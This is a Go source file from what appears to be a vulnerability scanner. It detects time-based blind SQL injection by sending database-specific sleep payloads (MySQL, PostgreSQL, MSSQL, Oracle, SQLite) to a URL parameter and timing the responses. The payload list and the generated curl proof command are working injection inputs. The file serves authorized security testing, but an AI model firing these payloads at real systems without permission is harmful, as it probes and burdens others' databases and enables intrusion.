// blind.go provides a standalone time-based blind SQL injection detection
// function. This can be called directly by other scanners or used as a library
// function for targeted parameter testing.
//
// The algorithm:
//  1. Baseline: send the normal request 3 times, measure average response time
//  2. For each DB-specific payload, inject a SLEEP/WAITFOR/pg_sleep and measure
//  3. If injected response takes >2.5s longer than baseline -> candidate
//  4. Double-check: inject again with a different delay to confirm (avoids FP from jitter)
package sqli

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"time"

	"github.com/stormbane-security/beacon/internal/finding"
)

// BlindResult holds the outcome of a time-based blind SQLi test.
type BlindResult struct {
	Vulnerable bool   // true if timing confirms injection
	Payload    string // the payload that triggered the delay
	DBType     string // mysql, mssql, postgres, oracle, sqlite
	BaselineMs int64  // normal response time in ms
	InjectedMs int64  // response time with sleep payload in ms
	DeltaMs    int64  // difference (InjectedMs - BaselineMs)
	ConfirmMs  int64  // confirmation probe response time in ms
}

// blindPayload defines a time-delay payload for a specific database.
type blindPayload struct {
	name   string
	dbType string
	// format takes a delay in seconds and returns the injection string.
	format func(seconds int) string
}

var blindPayloads = []blindPayload{
	// MySQL
	{name: "mysql-or-sleep-quote", dbType: "mysql", format: func(s int) string {
		return fmt.Sprintf("' OR SLEEP(%d)-- -", s)
	}},
	{name: "mysql-and-sleep-quote", dbType: "mysql", format: func(s int) string {
		return fmt.Sprintf("1' AND SLEEP(%d)-- -", s)
	}},
	// PostgreSQL
	{name: "pg-sleep-semi", dbType: "postgres", format: func(s int) string {
		return fmt.Sprintf("'; SELECT pg_sleep(%d)-- -", s)
	}},
	// MSSQL
	{name: "mssql-waitfor-semi", dbType: "mssql", format: func(s int) string {
		return fmt.Sprintf("'; WAITFOR DELAY '0:0:%d'-- -", s)
	}},
	// Oracle
	{name: "oracle-dbms-pipe", dbType: "oracle", format: func(s int) string {
		return fmt.Sprintf("' OR 1=dbms_pipe.receive_message('a',%d)-- -", s)
	}},
	// SQLite — CPU burn, no sleep primitive. Uses a large randomblob allocation
	// that takes measurable time on most systems.
	{name: "sqlite-randomblob", dbType: "sqlite", format: func(_ int) string {
		return "' OR 1=1 AND randomblob(100000000)-- -"
	}},
}

// BlindTimeSQLi tests a single URL parameter for time-based blind SQL injection.
// It measures baseline latency, injects sleep payloads, and confirms with a
// second delay to eliminate false positives from network jitter.
//
// Returns nil if no injection was detected.
func BlindTimeSQLi(ctx context.Context, client *http.Client, baseURL, param string) *BlindResult {
	if client == nil {
		client = &http.Client{Timeout: 30 * time.Second}
	}

	// Step 1: Measure baseline latency (3 requests, take median).
	baseline, err := measureBaseline(ctx, client, baseURL+"?"+param+"=1", 3)
	if err != nil {
		return nil
	}

	// Step 2: Try each payload.
	for _, bp := range blindPayloads {
		if ctx.Err() != nil {
			return nil
		}

		// First probe: 3-second delay.
		injected3 := bp.format(3)
		testURL3 := baseURL + "?" + param + "=" + url.QueryEscape(injected3)
		latency3, err := timeRequest(ctx, client, testURL3)
		if err != nil {
			continue
		}

		delta3 := latency3 - baseline
		if delta3 < 2500*time.Millisecond {
			continue // not significantly slower
		}

		// Step 3: Confirmation probe — 5-second delay. The delta should scale
		// proportionally (>4.5s over baseline). This eliminates FP from slow
		// servers or one-off network hiccups.
		injected5 := bp.format(5)
		testURL5 := baseURL + "?" + param + "=" + url.QueryEscape(injected5)

		// SQLite uses CPU burn, not sleep — skip proportional confirmation.
		if bp.dbType == "sqlite" {
			return &BlindResult{
				Vulnerable: true,
				Payload:    injected3,
				DBType:     bp.dbType,
				BaselineMs: baseline.Milliseconds(),
				InjectedMs: latency3.Milliseconds(),
				DeltaMs:    delta3.Milliseconds(),
			}
		}

		latency5, err := timeRequest(ctx, client, testURL5)
		if err != nil {
			continue
		}

		delta5 := latency5 - baseline
		if delta5 < 4500*time.Millisecond {
			continue // didn't track proportionally — likely jitter
		}

		return &BlindResult{
			Vulnerable: true,
			Payload:    injected3,
			DBType:     bp.dbType,
			BaselineMs: baseline.Milliseconds(),
			InjectedMs: latency3.Milliseconds(),
			DeltaMs:    delta3.Milliseconds(),
			ConfirmMs:  latency5.Milliseconds(),
		}
	}

	return nil
}

// BlindResultToFinding converts a BlindResult into a finding.Finding with the
// web.blind_sqli_time check ID.
func BlindResultToFinding(r *BlindResult, asset, path, param string) finding.Finding {
	return finding.Finding{
		CheckID:    finding.CheckWebBlindSQLiTime,
		Module:     "deep",
		Scanner:    scannerName,
		Severity:   finding.SeverityCritical,
		Confidence: finding.ConfidenceVerified,
		Title:      fmt.Sprintf("Time-based blind SQL injection in %s parameter at %s", param, path),
		Description: fmt.Sprintf(
			"Injected %s delay payload and measured %.0fms delta over %.0fms baseline "+
				"(confirmation: %.0fms). Database type: %s. Payload: %s",
			r.DBType, float64(r.DeltaMs), float64(r.BaselineMs),
			float64(r.ConfirmMs), r.DBType, r.Payload),
		Asset:    asset,
		DeepOnly: true,
		Evidence: map[string]any{
			"method":      "time-blind",
			"path":        path,
			"parameter":   param,
			"payload":     r.Payload,
			"db_type":     r.DBType,
			"baseline_ms": r.BaselineMs,
			"injected_ms": r.InjectedMs,
			"delta_ms":    r.DeltaMs,
			"confirm_ms":  r.ConfirmMs,
		},
		ProofCommand: fmt.Sprintf(
			`time curl -sk '%s?%s=%s'  # should take ~3s longer than baseline`,
			"<scheme>://"+asset+path, param, url.QueryEscape(r.Payload)),
		DiscoveredAt: time.Now(),
	}
}
